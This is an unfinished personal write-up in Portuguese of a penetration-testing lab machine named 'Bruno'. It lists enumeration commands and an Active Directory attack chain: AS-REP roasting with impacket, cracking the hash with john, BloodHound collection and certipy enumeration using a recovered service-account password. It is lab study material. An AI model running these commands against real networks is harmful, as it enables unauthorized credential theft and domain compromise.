Bruno
========================

## Enumeração

    sudo nmap_enum bruno.vl

![qownnotes-media-MgxJVk](../../../media/qownnotes-media-MgxJVk.png)

    sudo nmap -sU -p 53,111,113,161,500,2049 bruno.vl

![qownnotes-media-duKidc](../../../media/qownnotes-media-duKidc.png)


    sudo nmap -sS -p- --max-retries 0 -Pn -T5 bruno.vl

![qownnotes-media-dDDDsd](../../../media/qownnotes-media-dDDDsd.png)


### FTP Anonymous

    ftp -a 10.10.81.49

![qownnotes-media-abqnLc](../../../media/qownnotes-media-abqnLc.png)

Só tem na pasta app, no demais não tem mais nada exceto um test.exe dentro de "benign"

![qownnotes-media-saZKac](../../../media/qownnotes-media-saZKac.png)

Encontramos um vetor interessante... prosseguimos apartir [dessa sessão](#exploitation)

### HTTP


Enumerar diretórios

    feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://bruno.vl

Enumerar subdomínios/virtual hosts

    ffuf -H "Host: FUZZ.bruno.vl" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://bruno.vl -fs 703

![qownnotes-media-pIdUIN](../../../media/qownnotes-media-pIdUIN.png)

### SMB

    enum4linux -a -A 10.10.81.49

![qownnotes-media-aKHtiY](../../../media/qownnotes-media-aKHtiY.png)

    crackmapexec smb 10.10.81.49 -u '' -p '' --shares
 
    crackmapexec smb 10.10.81.49 -u 'guest' -p '' --shares

![qownnotes-media-hRYxrQ](../../../media/qownnotes-media-hRYxrQ.png)

    smbclient -U '' -N -L //10.10.81.49

### LDAP

    ldapsearch -x -H ldap://10.10.81.49 -s base
 

![qownnotes-media-dQwiZQ](../../../media/qownnotes-media-dQwiZQ.png)

### Kerberos

    kerbrute userenum -d bruno.vl /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.81.49

## exploitation

Embora eu tenha achado o subdomínio "dev", o que fez sentido considerar como próximos passos foi um arquivo chamado "changelog":

![qownnotes-media-WnfXAI](../../../media/qownnotes-media-WnfXAI.png)

então, dando sequência, prosseguimos com um usuário válido:

    echo "svc_scan" >> users.txt
    kerbrute userenum -d bruno.vl --dc 10.10.81.49 users.txt
    impacket-GetNPUsers -request -usersfile users.txt bruno.vl/ -dc-host brunodc.bruno.vl

![qownnotes-media-tsQyum](../../../media/qownnotes-media-tsQyum.png)

    john -w=/usr/share/wordlists/rockyou.txt hash.txt
 
Depois disso, fiz uma sincronização de relógio com o DC com o seguinte comando:

    sudo ntpdate 10.10.81.49
    bloodhound-python -c all --zip -u svc_scan -p Sunshine1 -dc brunodc.bruno.vl -ns 10.10.81.49

Com isso descobri uma outra conta que também possui a mesma senha por meio de as rep reoasting...

Resumindo, o que vamos fazer agora é tentar algo com o certipy:

    certipy-ad find -username svc_scan@bruno.vl -password Sunshine1 -dc-ip 10.10.81.49

Depois acabou alterando o IP da máquina, por conta do reset:

![qownnotes-media-SeRWjR](../../../media/qownnotes-media-SeRWjR.png)

